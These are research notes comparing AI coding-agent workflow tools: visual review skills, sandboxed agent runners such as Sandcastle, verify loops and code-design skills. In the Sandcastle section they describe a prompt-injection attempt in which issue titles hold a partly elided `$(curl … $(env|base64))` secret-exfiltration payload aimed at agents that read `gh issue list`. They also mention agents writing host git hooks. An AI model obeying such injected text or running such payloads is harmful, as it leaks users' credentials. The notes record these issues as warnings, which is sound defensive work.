# Local dev workflow research (2026-10-02)

Research for improving the local dev loop: visual review, Sandcastle and other agent runners, Lauren Tan's (poteto) workflow. Nothing adopted yet. Current baseline: `workflow.md` + the `implement` skill (plan → delegated agents → `fix`/`check`/tests → `/code-review` → PR); no visual verification step, agents run unsandboxed on the host.

Stars / last-push figures are from the GitHub API on 2026-10-02.

## 1. Visual recap / visual review

### `/visual-recap` (Steve Sewell, Builder.io): what Alex actually meant

[BuilderIO/skills](https://github.com/BuilderIO/skills) (4.5k stars, MIT, created 2026-06-10, pushed 2026-09-30). Read: README, `skills/visual-recap/SKILL.md`, `references/local-files.md`, `references/connection.md`, `.github/workflows/pr-visual-recap.yml`.

- **What:** turns a branch, commit, PR diff, or the whole current thread's work into an interactive recap: before/after wireframes of UI changes, `data-model` and `api-endpoint` blocks with change flags, file tree, 3-8 tabs of annotated key diffs. Skips itself for small diffs. Sibling `/visual-plan` does the same for plans before coding.
- **Wireframes are drawn from the diff**, not screenshots of the running app. It complements a verify step; it does not replace one.
- **Output:** MDX rendered by the Agent-Native Plans app ([BuilderIO/agent-native](https://github.com/BuilderIO/agent-native), source open).
- **Default mode is hosted:** publishes through a Plan MCP connector to `plan.agent-native.com` (account + OAuth; diff content stored there). Gives shareable links and comments. The skill forbids an inline fallback.
- **Local-files mode** (`AGENT_NATIVE_PLANS_MODE=local-files`): MDX written to `plans/<slug>/` or a temp dir; `npx @agent-native/core@latest plan local serve --dir <dir> --kind recap --open`. Content stays on the machine, but the viewer is still the hosted Plan UI reading a localhost bridge: needs network, Chromium (Safari blocks it), no hosted comments or sharing. Fully offline requires running the Plan app locally.
- **GitHub Action** (`pr-visual-recap.yml`): one sticky PR comment with a screenshot + plan link per PR. Needs `PLAN_RECAP_TOKEN` and `ANTHROPIC_API_KEY` (or OpenAI) repo secrets, so hosted mode and API billing.
- **Install:** `npx @agent-native/skills@latest add --skill visual-recap` (asks hosted / local / self-hosted, can add managed CLAUDE.md blocks and the Action); or `/plugin marketplace add BuilderIO/skills`; or plain copy `npx skills@latest add BuilderIO/skills --skill visual-recap`.
- **Closest alternative:** visual-explainer `/diff-review` (below): same idea as one self-contained HTML file, no service, no account, no comments.

### Other tools under "visual review"

Two meanings. (a) is the more common skill; the tools Alex half-remembered are (b).

### (a) Agent verifies its own UI

| Tool | What | Install | Notes |
|---|---|---|---|
| [agent-browser](https://github.com/vercel-labs/agent-browser) (vercel-labs, 43k) | Browser CLI: `screenshot --annotate`, `diff screenshot --baseline`, `record start` (needs ffmpeg), bundled `dogfood` QA skill | `npm i -g agent-browser`, `npx skills add vercel-labs/agent-browser` | Fallback driver when the harness has no browser |
| [before-and-after](https://github.com/vercel-labs/before-and-after) (vercel-labs, 389) | Formats existing screenshots/videos into a replaceable before/after block in the PR body | `npx skills add vercel-labs/before-and-after#main`; needs agent-browser, gh 2.99+ | Does no capture itself |
| [compound-engineering](https://github.com/EveryInc/compound-engineering-plugin) `ce-test-browser` / `ce-polish` (EveryInc, 25k) | Maps changed files → routes, reports pass/fail/skip per route; prefers the harness's own browser, falls back to agent-browser | plugin | Closest fit to T3's preview tools |
| [gstack](https://github.com/garrytan/gstack) `/design-review`, `/qa` (garrytan, 135k) | Designer-eye audit, atomic fix commits, before/after screenshots | clone to `~/.claude/skills/gstack`, `./setup`; needs Bun + its own browser | Heavy; routes all browsing through itself. Borrow from, don't install |
| [agent-device](https://github.com/callstack/agent-device) (Callstack, 4.8k) | Mobile equivalent: iOS simulator / Android snapshots, screenshots, `dogfood` skill | CLI + skills | For fitjournal |

### (b) Human reviews in a visual UI

| Tool | What | Install | Notes |
|---|---|---|---|
| [Plannotator](https://github.com/backnotprop/plannotator) (backnotprop, 9.1k) | Browser UI to annotate plans, markdown, HTML artifacts, diffs/PRs; feedback returns to the agent; hooks plan mode | `curl -fsSL https://plannotator.ai/install.sh \| bash`, then `/plugin marketplace add backnotprop/plannotator` | Binary + hooks, not a plain skill; checks GitHub for releases on load |
| [difit](https://github.com/yoshiko-pg/difit) (yoshiko-pg, 3.2k) | Local GitHub-style diff viewer; inline comments print to stdout on exit, agent addresses them; agent can pre-seed comments | `npx skills add yoshiko-pg/difit` | Diffs only, explicit opt-in |
| [visual-explainer](https://github.com/nicobailon/visual-explainer) (nicobailon, 10.1k) | Agent generates a self-contained HTML page: `/diff-review` (file map, Mermaid, before/after, risks), `/plan-review` | plugin, or copy folder to `.agents/skills/` | Read-only, no comment loop back |

Also: [agentation](https://github.com/benjitaylor/agentation) (click-to-annotate on the running app, via MCP); terminal diff reviewers hunk, tuicr, revdiff (last two not opened). Vibe Kanban is sunsetting: skip.

Not checked: Chrome DevTools MCP, Playwright MCP, built-in browser/diff features in Codex and Cursor.

### Recurring patterns

- Driver policy: harness's own browser first, one fallback CLI, never mix drivers mid-run.
- Scope from the diff: changed files → routes/screens → fixed viewports.
- Evidence as artifact: before/after pairs or video in a marked, replaceable PR block.
- Explicit done condition: every route marked pass/fail/skip with a reason.
- For (b): local server, inline comments, structured feedback via stdout or hook, explicit opt-in.

## 2. Sandcastle and other runners

[mattpocock/sandcastle](https://github.com/mattpocock/sandcastle): MIT TypeScript library, npm `@ai-hero/sandcastle`. Orchestrates coding agents in sandboxes via `sandcastle.run()`.

- **Sandboxes:** Docker (default, plain container), Podman, Vercel Firecracker microVMs, custom, or `noSandbox()`.
- **Branch strategies:** `head` (bind-mounts host working dir; Docker default), `merge-to-head` (temp branch in a worktree, merged back), `branch` (named branch in a worktree). Worktree path hard-coded to `<repo>/.sandcastle/worktrees/` (#530 open).
- **Agents:** claudeCode, codex, pi, cursor, opencode, copilot.
- **Invocation:** library-first: write `.sandcastle/main.ts`, run with `npx tsx`. CLI only does `init` and image build/remove.
- **Auth:** `.sandcastle/.env` with `CLAUDE_CODE_OAUTH_TOKEN` (`claude setup-token`, uses the subscription) or `ANTHROPIC_API_KEY`.
- **Loop** (`parallel-planner-with-review` template): Opus planner over open issues → one sandbox + branch per issue (implementer, then reviewer) → merge agent; repeats up to 10 times. Prompts pull context with `gh issue list`. Backlog.md support unverified.
- **Maturity:** 8.2k stars, created 2026-03-17. Releases every few days through v0.12.0 (2026-06-29), nothing since. 113 open issues, 63 open PRs. Matt still comments on issues (2026-09-29).
- **Known problems:** #1010 worktree mode mounts host `.git` read-write (agent can write hooks/config that run on the host); #854 bind-mount worktrees corrupt git worktree metadata on macOS; #870 prompt injection via issue comments; #386 no multi-repo.
- **Live injection attempt seen:** issues #983-988 carry `$(curl … $(env|base64))` payloads in their titles. Its templates feed `gh issue list` into prompts, so this targets its users.
- **Related:** [mattpocock/skills](https://github.com/mattpocock/skills) (grill, `to-spec`, `to-tickets`, `implement`, `tdd`, `code-review`, `triage`). Its README never mentions Sandcastle; the "PRD → issues → Ralph loop → manual QA, Sandcastle as AFK runner" chain is from search snippets only.

### Alternatives

| Tool | Isolation | Parallel | Review/merge | macOS |
|---|---|---|---|---|
| [Claude Code sandbox](https://code.claude.com/docs/en/sandboxing) | Seatbelt: filesystem + domain-allowlist proxy; denies `.git/hooks`, `.git/config` writes | n/a | n/a | Yes, nothing to install |
| [Claude Code worktrees](https://code.claude.com/docs/en/worktrees) | Worktree only | `--worktree`, subagent `isolation: worktree`, `WorktreeCreate` hook for custom paths | Manual | Yes |
| [Docker Sandboxes `sbx`](https://docs.docker.com/ai/sandboxes/) | MicroVM, host-side proxy, credentials stay outside | Per sandbox | Manual | Unverified |
| [container-use](https://github.com/dagger/container-use) | Container + branch per agent, via MCP | Yes | `git checkout <branch>` | Yes; experimental, last release 2025-08 |
| [Conductor](https://www.conductor.build/docs/) | Workspace + branch per task | Yes | Diff → PR → merge → archive | Mac only |
| [Sculptor](https://github.com/imbue-ai/sculptor) | Worktree; container backend experimental | Yes | Diff, PR | Apple Silicon; research preview |
| [Nimbalyst](https://github.com/nimbalyst/nimbalyst) (ex-Crystal) | Worktree | Yes, session kanban | Red/green diff | Yes |

Parallel-session managers seen by repo metadata only, none shown to sandbox: cmux, Superset, Emdash, claude-squad.

### Read

Sandcastle adds container isolation for unattended runs and a scripted plan → parallel implement → review → merge loop outside a Claude session. Worktrees, board and review already exist here (`bin/wt`, Backlog.md, `implement`). Costs: Docker Desktop, a Dockerfile + `main.ts` per repo, a subscription token in `.env`, a worktree path that conflicts with `wt/<repo>/<task>`, glue for Backlog.md. Cheaper first step: Claude Code's native sandbox over the existing worktrees. Revisit if releases resume and #1010, #854 close.

## 3. Lauren Tan (@poteto)

- **Talk:** "How Cursor Turned AI Agents Into Better Engineers", Maven / Lenny's Workshops, 2026-08-12, 60 min: <https://maven.com/p/e23d9c/how-cursor-turned-ai-agents-into-better-engineers>. The specific tweet Alex saw was not found.
- **Transcript:** <https://cho.sh/7D77B5> (no source metadata; matched to the talk by topics). Read through a summarizing model, so quotes below may not be exact.
- **Repo:** [cursor/plugins pstack](https://github.com/cursor/plugins/tree/main/pstack). Claude Code ports, not opened: [alexopotto/pstack-claude](https://github.com/alexopotto/pstack-claude), [michael-denyer/pstack-claude](https://github.com/michael-denyer/pstack-claude).
- **Not accessed:** her X article "How I Use Cursor" (<https://x.com/poteto/article/2058975157503570132>).

### From the talk

- Trust curve: start heavily in the loop with a handful of agents; parallelize only after trust. Now mostly cloud agents, auto-merging PRs.
- Verification is the core skill: the agent must run the code, take CPU traces or heap snapshots. A control skill (Chrome DevTools Protocol) plus a "feature map" telling the agent how to reach each feature (shortcuts, DOM attributes).
- Evals for skills: coordinator, blinded subagents, a rubric, looped until 10/10.
- Hard over soft constraints: codebase structure, import blocking, CI lints, compiler diagnostics ahead of rules and skills.
- Repeated review feedback is a code smell: turn it into a hard rule.
- Atomic PRs, 50 to ~1000 lines.

### From pstack

- `/poteto-mode` matches the task to one of 23 playbooks and copies its steps into a todo list.
- Feature playbook: "You own the design. Plan, review, verify. Delegate implementation."
- Throughput checkpoint before fanning out: blocking first steps, independent workstreams, shared mutable state, smallest safe decomposition.
- One worktree per parallel task, off main.
- `/arena` (N attempts, graft the best), `/swarm` (N slices, one report), `/interrogate` (other models attack the diff).
- Overnight runs: fresh worktree, a pass/fail finish condition ("a duration is not a finish condition"), `decisions.tsv` log, escape hatch. No owner merges on its own verdict.
- PR body: Why / Scope / Tradeoffs / Blast Radius / Verification.

## 4. Verify loop: pstack and Matt Pocock, read from source (2026-10-02)

Clones in `local/trials/` (`cursor-plugins/pstack` @ c47b128, `mattpocock-skills` @ d81f3a1). This supersedes the transcript-based summary in § 3 where they differ.

### pstack's verify chain

1. **Finish condition in the first prompt**, as checks that pass or fail. Match the check to the change: CLI → run the real command; UI → walk the changed flow in the running app; parser/migration → replay a saved input; perf → before/after profile; storage → read back the written value. "Inconclusive" is a valid result; a confident reply without evidence is a red flag. (`docs/guide/06-verify-and-ship.md`)
2. **Per-project `verify-<app>` skill**, generated by `/create-verification-skill` by interviewing the repo: sections Launch, Doctor (one read-only "is this instance worth driving?" check), Drive (real selectors/commands), Evidence, Cleanup (kill only what you started; never delete the proof). Plus a **feature map**: one file per feature with `Sub-features`, `How to get to it (user POV)`, `Driving it with <harness>`, `Gotchas`. The generator must run its own output end to end once before handing over. `/maintain-verification-skill` audits drift and ends `clean` / `changed` / `blocked`.
3. **Verify on the matching surface.** Wrong surface or inconclusive is not a pass (feature step 5, bug-fix step 4).
4. **Bug fix = reproduce first** on the same surface, binary-search with runtime evidence, and stage commits so the failing repro lands before the fix.
5. **The agent that judges a change is never the one that wrote it** (Shipping playbook: one fresh verifier per PR).
6. **`/blast-radius`**: find the one fact a change is safe because of and prove it by running code. Confidence ladder: said so → pointed at the line → walked the failure → ran it → reproduced in the app.
7. **Claims carry a label**: measured, inferred, or guess, in the same sentence.
8. **Encode lessons in structure**: second time you write an instruction, make it a lint/check/script and delete the instruction. `/reflect` mines the transcript for these.
9. **Unattended runs**: predicate, fresh worktree, `decisions.tsv` (ts, phase, decision, why, evidence, result; append-only), then a different-model reviewer writes an "Attention" section.

Not for us at current scale: the 23 principle skills, `/arena` / `/swarm` multi-model fan-out, autopilot and orchestrate playbooks, Bugbot triage.

### Matt Pocock: worth stealing

- **`pr` body template**: Summary as the smallest visual (call tree, diff sketch, file tree, Mermaid) / Evidence before-after (screenshots S-tier, execution output A-tier) / Merge Danger (one-way or two-way door + blast radius). A text-only recap inside the PR, no service.
- **`code-review` two axes** in separate subagents: Standards (repo standards + Fowler smells) and **Spec** (missing, scope creep, implemented-but-wrong, each quoting the spec line). Never merged or reranked. Our `/code-review` hunts bugs; nothing checks the diff against the plan.
- **`retro`**: after a session, propose environment fixes: navigation pointers, automated checks, standards (mechanical violation → lint, not a written rule), CLAUDE.md bloat, tool economy, no-op instructions, information access. Standards belong to the reviewer agent, which has the least context pressure; CLAUDE.md is for navigation pointers only.
- **`grilling`**: design tree; ask the whole frontier per round, each question with a recommended answer; facts are the agent's job (look them up), decisions are the user's.
- **`to-tickets`**: tracer-bullet vertical slices, each demoable alone and sized for one fresh context, with blocking edges; wide refactors go expand → migrate in batches → contract.
- **`diagnosing-bugs`**: phase 1 is one red-capable command (asserts the user's exact symptom, deterministic, seconds, agent-runnable) before any hypothesis; 3-5 falsifiable hypotheses; debug logs tagged with a unique prefix so cleanup is one grep.

Skip: `setup-matt-pocock-skills` tracker wiring, `git-guardrails` hook (conflicts with Claude owning git here).

### Where both agree

Real-artifact evidence before "done"; reviewer separate from author; lessons become lints; small vertical units that each end in a check.

## 5. Code design: codebase-design and zero-tech-debt (2026-10-02)

### `codebase-design` (Matt Pocock)

`mattpocock-skills/skills/engineering/codebase-design/` (SKILL.md, DEEPENING.md, DESIGN-IT-TWICE.md). Model-invoked vocabulary skill, about 115 lines; other skills load it.

- **Fixed vocabulary**, used exactly: module (anything with an interface and an implementation, any scale), interface (everything a caller must know: types plus invariants, ordering, error modes, config, performance), depth (behaviour reachable per unit of interface), seam (where an interface lives), adapter (what fills a seam), leverage (what callers get), locality (what maintainers get). Banned synonyms: component, service, API, boundary.
- **Deletion test:** imagine deleting the module. Complexity vanishes → it was a pass-through. Complexity reappears across N callers → it earns its keep.
- **The interface is the test surface.** Wanting to test past the interface means the module is the wrong shape.
- **One adapter = hypothetical seam, two = real.** Production + test double counts as two. A single-adapter seam is indirection.
- **Dependency categories decide the test strategy** (DEEPENING.md): in-process → merge and test directly; local-substitutable (PGLite, in-memory fs) → test with the stand-in, no port; remote-but-owned → port + in-memory adapter; true external → injected port + mock.
- **Replace, don't layer:** once tests exist at the deepened interface, delete the old shallow-module unit tests.
- **Design it twice:** 3+ parallel subagents each design the interface under a different constraint (minimal interface / max flexibility / common caller trivial / ports and adapters); compare on depth, locality, seam placement; give one recommendation.
- Companion `/improve-codebase-architecture`: scope to hot spots from `git log`, a subagent explores for friction, output is a self-contained HTML report in the temp dir with before/after diagrams and a strength badge per candidate, then grilling on the chosen one. Proposes no interfaces until a candidate is picked.

### `zero-tech-debt` (Jeremy Longshore, not Matt Pocock)

Not in `mattpocock/skills` at d81f3a1 (no match in skills, changelog, or deprecated list; clone is shallow so older history unchecked). The skill by this name is [jeremylongshore/tons-of-skills-marketplace](https://github.com/jeremylongshore/tons-of-skills-marketplace) `plugins/skill-enhancers/zero-tech-debt` (2.8k stars, MIT, v1.1.0). A Matt Pocock tweet surfaced in search for the term but could not be opened, so any link between him and this skill is unconfirmed.

- **Core:** "Treat the current implementation as evidence, not authority." Rebuild toward the intended shape, not the minimal diff. Explicitly not for hotfixes, bug repros, security backports.
- **Workflow:** define the end state in 1-3 paragraphs (stop if you can't) → audit reality against it (why it exists, who calls it, does it still earn value) → delete before adding → optimize around the final shape → collapse duplicate decision logic (permissions, validation, retry in one place) → remove historical leakage (`_v2`, `Legacy*`, names that leak old infra) → validate (re-grep deleted paths, walk UI flows, tests assert intended behaviour not historical quirks).
- **Rules worth keeping:** never add a new abstraction in the same change that removes an old one; a rename updates every caller in the same commit; one coherent end state per refactor; deeper rot found mid-flight is documented and deferred, not chained.
- **Audit greps:** TODO/DEPRECATED markers, `_v2|_old|_new|_legacy` names, stale flags, pass-through wrappers, dual-mode forks, duplicate config keys, comments that explain a name is wrong, tests asserting "legacy behavior", single-implementation interfaces.
- **Report format:** Deleted (counts) / Unified (N paths → 1) / Renamed (with the domain reason) / Intentionally left alone / Deferred (as tickets).
- **Preflight** is partly team/production-shaped (rollback via flag, in-flight migrations, telemetry and on-call alerts): mostly n/a for personal projects.

### Read

- The two agree: inline single-implementation indirection, test intended behaviour through the interface, delete rather than wrap. They differ in job: `codebase-design` is a vocabulary for deciding shape; `zero-tech-debt` is a procedure for a cleanup pass.
- pstack states the same cleanup rules more tightly (subtract-before-you-add, redesign-from-first-principles, migrate-callers-then-delete-legacy-apis). `zero-tech-debt` adds the audit greps and the report format.
- `codebase-design` is the stronger steal: small, precise, and usable as the standard a reviewer agent enforces.

## Candidate changes to our workflow

Proposal as of 2026-10-02; nothing applied.

1. **`implement` skill**
   - Plan step records a **finish condition**: pass/fail checks matched to the change type.
   - New **verify** step after tests: a fresh agent drives the matching surface and marks each affected `qa/` case pass / fail / inconclusive with evidence.
   - Review step adds a **spec axis**: diff vs the plan recorded in the living doc.
   - Land step uses a PR body template: Summary visual / Evidence before-after / Merge Danger.
   - Multi-task work is split into vertical slices with blocking edges on the board.
2. **Per-project verify recipe** in `qa/README.md` (Launch, Doctor, Drive, Evidence, Cleanup); each `qa/` case gains "how to reach it" and "how to drive it". A `verify-setup` skill generates it from the repo and must run it once end to end.
3. **Bug-fix path**: repro command first, failing repro committed before the fix.
4. **`done` skill** gains a retro pass: a correction made twice becomes a lint in the project's `check`.
5. **Recap for review**: `/visual-recap` trial was started on hookdeck/terraform-provider-hookdeck#230 and stopped before running any Builder tooling. Pocock's `pr` template covers part of the need with no service.
6. **Native sandbox** for delegated agents. Unverified under T3 Code.
7. Sandcastle: skip for now (see § 2 Read).
8. **Design standard for reviewers**: adopt the `codebase-design` vocabulary, deletion test, two-adapter rule, and interface-as-test-surface as the review standard (read at review, not in CLAUDE.md). Design-it-twice in `implement`'s plan step when a real design fork exists.
9. **Refactor path** in `implement`: end state in 1-3 paragraphs → audit → delete first (never add an abstraction in the same change) → validate → report as Deleted / Unified / Renamed / Left alone / Deferred (deferred items go to the board). Convention for personal projects: no compatibility shims; migrate callers and delete in the same change.
